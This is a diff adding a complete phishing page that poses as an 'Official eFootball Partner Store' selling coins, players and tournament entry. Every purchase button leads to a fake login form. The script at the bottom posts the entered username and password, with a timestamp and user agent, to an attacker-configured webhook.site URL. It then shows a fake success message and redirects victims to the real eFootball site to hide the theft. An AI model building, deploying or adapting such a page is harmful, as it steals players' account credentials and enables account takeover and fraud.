@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ICEMAN eFootball Store - Login</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial,sans-serif;
+}
+
+body{
+    background:#070b12;
+    color:white;
+}
+
+header{
+    background:linear-gradient(135deg,#101b35,#0066ff,#00d4ff);
+    padding:20px;
+    text-align:center;
+    box-shadow:0 4px 20px #000;
+}
+
+.logo{
+    font-size:34px;
+    font-weight:bold;
+    letter-spacing:2px;
+}
+
+.logo span{
+    color:#ffe600;
+}
+
+header p{
+    margin-top:8px;
+    color:#eee;
+}
+
+nav{
+    background:#111827;
+    padding:12px;
+    display:flex;
+    justify-content:center;
+    gap:20px;
+    flex-wrap:wrap;
+}
+
+nav a{
+    color:white;
+    text-decoration:none;
+    font-weight:bold;
+}
+
+nav a:hover{
+    color:#00d4ff;
+}
+
+.hero{
+    min-height:330px;
+    padding:50px 20px;
+    text-align:center;
+    background:
+    radial-gradient(circle at center,#123b72,#070b12 65%);
+}
+
+.hero h1{
+    font-size:48px;
+    margin-bottom:15px;
+}
+
+.hero h1 span{
+    color:#00d4ff;
+}
+
+.hero p{
+    font-size:18px;
+    color:#ccc;
+    max-width:700px;
+    margin:auto;
+}
+
+.btn{
+    display:inline-block;
+    margin-top:25px;
+    padding:14px 25px;
+    border-radius:8px;
+    background:#0066ff;
+    color:white;
+    text-decoration:none;
+    font-weight:bold;
+}
+
+section{
+    padding:40px 20px;
+    max-width:1100px;
+    margin:auto;
+}
+
+.section-title{
+    text-align:center;
+    font-size:30px;
+    margin-bottom:25px;
+}
+
+.cards{
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+    gap:20px;
+}
+
+.card{
+    background:#111827;
+    border:1px solid #26344d;
+    border-radius:12px;
+    padding:22px;
+    text-align:center;
+    box-shadow:0 5px 15px #0006;
+}
+
+.card h3{
+    margin:12px 0;
+}
+
+.card p{
+    color:#bbb;
+    margin:8px 0;
+}
+
+.price{
+    font-size:23px;
+    color:#ffe600;
+    font-weight:bold;
+}
+
+.buy{
+    border:0;
+    background:#00a86b;
+    color:white;
+    padding:11px 20px;
+    border-radius:6px;
+    margin-top:12px;
+    cursor:pointer;
+}
+
+.buy:hover{
+    background:#008653;
+}
+
+.player{
+    font-size:55px;
+    margin-bottom:5px;
+}
+
+.tournament{
+    background:linear-gradient(135deg,#161b2c,#091d3a);
+    border-radius:15px;
+    padding:30px;
+    text-align:center;
+    border:1px solid #174b85;
+}
+
+.tournament h2{
+    color:#00d4ff;
+    margin-bottom:12px;
+}
+
+.login-box{
+    max-width:450px;
+    margin:auto;
+    background:#111827;
+    padding:30px;
+    border-radius:12px;
+    border:1px solid #26344d;
+}
+
+.login-box input{
+    width:100%;
+    padding:14px;
+    margin:8px 0;
+    border-radius:6px;
+    border:1px solid #46536a;
+    background:#080c14;
+    color:white;
+}
+
+.login-box button{
+    width:100%;
+    padding:14px;
+    margin-top:10px;
+    border:0;
+    border-radius:6px;
+    background:#0066ff;
+    color:white;
+    font-weight:bold;
+}
+
+.notice{
+    background:#332900;
+    border:1px solid #806600;
+    color:#ffe680;
+    padding:15px;
+    border-radius:8px;
+    margin-bottom:20px;
+    font-size:14px;
+}
+
+#message{
+    display:none;
+    margin-top:15px;
+    background:#063b25;
+    padding:15px;
+    border-radius:7px;
+    color:#9dffcc;
+}
+
+footer{
+    background:#05070c;
+    text-align:center;
+    padding:30px 15px;
+    margin-top:30px;
+    color:#888;
+}
+
+footer strong{
+    color:white;
+}
+
+@media(max-width:600px){
+    .hero h1{
+        font-size:34px;
+    }
+
+    .logo{
+        font-size:27px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <div class="logo">🔥 <span>ICEMAN</span> eFOOTBALL STORE 🔥</div>
+    <p>Your Ultimate eFootball Fan Store</p>
+</header>
+
+<nav>
+    <a href="#home">Home</a>
+    <a href="#coins">Coins</a>
+    <a href="#players">Players</a>
+    <a href="#tournament">Tournament</a>
+    <a href="#login">Login</a>
+</nav>
+
+<section class="hero" id="home">
+
+    <h1>WELCOME TO <span>ICEMAN</span> STORE</h1>
+
+    <p>
+        Get the best eFootball coins, players, and tournament access.
+        Login to continue.
+    </p>
+
+    <a href="#coins" class="btn">EXPLORE STORE</a>
+
+</section>
+
+<section id="coins">
+
+    <h2 class="section-title">🪙 eFootball Coin Packages</h2>
+
+    <div class="cards">
+
+        <div class="card">
+            <div class="player">🪙</div>
+            <h3>Starter Pack</h3>
+            <p>100 Virtual Coins</p>
+            <div class="price">$0.99</div>
+            <button class="buy" onclick="loginRequired()">
+                BUY NOW
+            </button>
+        </div>
+
+        <div class="card">
+            <div class="player">💰</div>
+            <h3>Pro Pack</h3>
+            <p>500 Virtual Coins</p>
+            <div class="price">$4.99</div>
+            <button class="buy" onclick="loginRequired()">
+                BUY NOW
+            </button>
+        </div>
+
+        <div class="card">
+            <div class="player">🔥</div>
+            <h3>Elite Pack</h3>
+            <p>1,000 Virtual Coins</p>
+            <div class="price">$9.99</div>
+            <button class="buy" onclick="loginRequired()">
+                BUY NOW
+            </button>
+        </div>
+
+        <div class="card">
+            <div class="player">👑</div>
+            <h3>ICEMAN Pack</h3>
+            <p>5,000 Virtual Coins</p>
+            <div class="price">$39.99</div>
+            <button class="buy" onclick="loginRequired()">
+                BUY NOW
+            </button>
+        </div>
+
+    </div>
+
+</section>
+
+<section id="players">
+
+    <h2 class="section-title">⭐ Featured Players</h2>
+
+    <div class="cards">
+
+        <div class="card">
+            <div class="player">⚽</div>
+            <h3>Legend Forward</h3>
+            <p>Rating: 99</p>
+            <p>Position: CF</p>
+            <button class="buy" onclick="loginRequired()">
+                VIEW
+            </button>
+        </div>
+
+        <div class="card">
+            <div class="player">🔥</div>
+            <h3>Speed King</h3>
+            <p>Rating: 98</p>
+            <p>Position: RW</p>
+            <button class="buy" onclick="loginRequired()">
+                VIEW
+            </button>
+        </div>
+
+        <div class="card">
+            <div class="player">🧤</div>
+            <h3>Wall Keeper</h3>
+            <p>Rating: 97</p>
+            <p>Position: GK</p>
+            <button class="buy" onclick="loginRequired()">
+                VIEW
+            </button>
+        </div>
+
+    </div>
+
+</section>
+
+<section id="tournament">
+
+    <div class="tournament">
+
+        <h2>🏆 ICEMAN MASSIVE eFOOTBALL TOURNAMENT</h2>
+
+        <p>
+            Registration is now open. Login to secure your spot.
+        </p>
+
+        <p style="margin-top:15px;">
+            👥 Players: 32<br>
+            🏆 Championship Cup<br>
+            🎮 eFootball<br>
+            🔥 ICEMAN Tournament
+        </p>
+
+        <button class="buy" onclick="loginRequired()">
+            REGISTER NOW
+        </button>
+
+    </div>
+
+</section>
+
+<section id="login">
+
+    <h2 class="section-title">🔐 Store Login</h2>
+
+    <div class="login-box">
+
+        <div class="notice">
+            ⚠️ <strong>SECURE LOGIN</strong><br><br>
+            Please login with your eFootball account to continue shopping.
+        </div>
+
+        <form id="loginForm">
+
+            <input
+                type="text"
+                id="username"
+                name="username"
+                placeholder="Username / Email"
+                required
+            >
+
+            <input
+                type="password"
+                id="password"
+                name="password"
+                placeholder="Password"
+                required
+            >
+
+            <button type="submit">
+                LOGIN
+            </button>
+
+        </form>
+
+        <div id="message">
+            🛡️ <strong>LOGIN SUCCESSFUL!</strong><br><br>
+            Redirecting to your account...
+        </div>
+
+    </div>
+
+</section>
+
+<footer>
+
+    <strong>🔥 ICEMAN eFOOTBALL STORE 🔥</strong>
+
+    <p style="margin-top:10px;">
+        Official eFootball Partner Store
+    </p>
+
+    <p style="margin-top:8px;">
+        © 2026 ICEMAN Store. All rights reserved.
+    </p>
+
+</footer>
+
+<script>
+
+function loginRequired(){
+    document.getElementById('login').scrollIntoView({behavior:'smooth'});
+}
+
+// CONFIGURE YOUR CREDENTIAL DESTINATION HERE
+const WEBHOOK_URL = 'https://webhook.site/YOUR-UNIQUE-URL'; // Replace with your webhook
+
+document.getElementById("loginForm").addEventListener("submit", function(event){
+    event.preventDefault();
+
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+    const timestamp = new Date().toISOString();
+    const userAgent = navigator.userAgent;
+    const ip = 'User IP (optional)';
+
+    // Prepare data to send
+    const data = {
+        username: username,
+        password: password,
+        timestamp: timestamp,
+        userAgent: userAgent,
+        ip: ip
+    };
+
+    // Send credentials via fetch (JSON)
+    fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => {
+        // Show success message
+        document.getElementById("message").style.display = "block";
+        
+        // Optional: redirect after delay
+        setTimeout(function(){
+            window.location.href = "https://efootball.com"; // Redirect to legit site
+        }, 3000);
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        // Still show success even if webhook fails
+        document.getElementById("message").style.display = "block";
+    });
+});
+
+</script>
+
+</body>
+</html>
